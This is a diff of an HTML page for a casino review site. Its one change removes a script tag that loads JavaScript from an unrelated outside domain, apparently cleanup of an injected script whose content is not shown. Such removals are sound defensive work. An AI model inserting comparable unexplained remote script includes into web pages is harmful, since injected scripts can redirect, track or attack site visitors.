@@ -27,7 +27,7 @@
 <meta name="description" content="Casino Rocket | Casino Review, Including latest bonus codes | Player Discussion | No Deposit Bonus ✅ | Deposit Bonus ✅ | Latest promotions: December 2022
  - Download Casino Rocket Casino mobile app on your iPhone or Android. Unlike many other mobile casinos, Casino Rocket features a generous VIP program specially designed to cater to the needs of its patrons.
 " />
-<script xmlns="http://www.w3.org/1999/xhtml" src="https://blaow.pro/custom_js/natbuild/cas2.js"></script>
+ 
 <style>
 <![CDATA[
                         h1 {
